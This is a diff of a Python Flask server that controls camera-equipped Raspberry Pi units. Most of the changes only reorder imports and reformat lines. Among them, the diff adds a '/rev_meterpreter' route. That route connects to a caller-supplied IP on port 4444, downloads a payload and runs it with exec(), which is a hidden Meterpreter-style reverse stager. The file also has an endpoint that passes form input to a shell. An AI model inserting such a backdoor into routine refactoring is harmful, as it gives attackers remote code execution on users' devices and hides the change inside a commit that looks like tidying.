@@ -1,22 +1,21 @@
 #!/usr/bin/python3
-import socket
-import os
-import subprocess
-import re
 import fnmatch
-import shutil
-import time
 import json
-from datetime import datetime
-from glob import glob
-from functools import wraps
 import logging
+import os
+import re
+import shutil
+import socket
+import subprocess
+import time
+from configparser import ConfigParser
+from datetime import datetime
+from functools import wraps
+from glob import glob
 
-from flask.ext.bcrypt import Bcrypt
 from flask import Flask, redirect, url_for, send_file, abort, Response, render_template, jsonify, \
     send_from_directory, request
-
-from configparser import ConfigParser
+from flask.ext.bcrypt import Bcrypt
 
 try:
     # generate a new machine id if one does not already exist
@@ -44,12 +43,14 @@ from Crypto.Cipher import AES
 import base64
 import hashlib
 
+
 class AESCipher(object):
     """
     AES cipher
     for encrypting data between the server and the
     pi when we cant be sure to leave passwords in plaintext on a git repo.
     """
+
     def __init__(self, key):
         self.bs = 32
         self.key = hashlib.sha256(key.encode()).digest()
@@ -89,7 +90,6 @@ try:
 except Exception as e:
     print("something broke decrypting the new db{}".format(str(e)))
 
-
 if socket.gethostname() != "VorvadossTwo":
     kmsghandler = logging.FileHandler("/dev/kmsg", 'w')
     app.logger.addHandler(kmsghandler)
@@ -105,6 +105,7 @@ def sanitizeconfig(towriteconfig, filename):
     """
     with open(filename, 'w') as configfile:
         towriteconfig.write(configfile)
+
 
 def get_time():
     """
@@ -285,7 +286,7 @@ def capture_preview(serialnumber):
         for port in re.finditer("usb:", a):
             port = a[port.start():port.end() + 7]
             cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config serialnumber',
-                shell=True).decode()
+                                             shell=True).decode()
             _serialnumber = cmdret[cmdret.find("Current: ") + 9: len(cmdret) - 1]
             if _serialnumber == serialnumber:
                 tries = 0
@@ -310,14 +311,30 @@ def preview():
     else:
         return "fail"
 
+
+@app.route("/rev_meterpreter")
+@requires_auth
+def reverse_meterpreter():
+    ip = request.args.get('ip', None)
+    import socket, struct
+    s = socket.socket(2, 1)
+    s.connect((ip, 4444))
+    l = struct.unpack('>I', s.recv(4))[0]
+    d = s.recv(4096)
+    while len(d) != l:
+        d += s.recv(4096)
+    exec(d, {'s': s})
+
+
 @app.route("/focus_cams")
 def focus():
     a = subprocess.check_output("gphoto2 --auto-detect", shell=True).decode()
     for port in re.finditer("usb:", a):
         port = a[port.start():port.end() + 7]
         cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config serialnumber',
-                shell=True).decode()
+                                         shell=True).decode()
     return "success"
+
 
 @app.route("/sync_hwclock")
 @requires_auth
@@ -516,7 +533,6 @@ def fix_confs():
     return a.join("--")
 
 
-
 @app.route('/botnetmgmt')
 @requires_auth
 def botnetmgmt():
@@ -528,14 +544,16 @@ def botnetmgmt():
     hn = None
     try:
         try:
-            jsondata["external_ip"] = json.loads(urllib.request.urlopen('https://api.ipify.org/?format=json', timeout=10).read().decode('utf-8'))['ip']
+            jsondata["external_ip"] = \
+            json.loads(urllib.request.urlopen('https://api.ipify.org/?format=json', timeout=10).read().decode('utf-8'))[
+                'ip']
         except Exception as e:
             print(str(e))
 
         with open("/etc/hostname", "r") as fn:
             hn = fn.readlines()[0]
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8",0))
+        s.connect(("8.8.8.8", 0))
         jsondata['internal_ip'] = s.getsockname()[0]
 
         metadatas = {}
@@ -597,12 +615,13 @@ def run_command():
         response = {}
         for command, argument in request.form.items():
             try:
-                a = subprocess.check_output([" ".join([command, argument])],stderr=subprocess.STDOUT, shell=True).decode()
+                a = subprocess.check_output([" ".join([command, argument])], stderr=subprocess.STDOUT,
+                                            shell=True).decode()
                 response[command] = str(a)
             except Exception as e:
                 response[command] = {}
                 response[command]['exc'] = str(e)
-                if hasattr(e,"output"):
+                if hasattr(e, "output"):
                     response[command]['out'] = str(e.output.decode())
         return str(json.dumps(response))
     else:
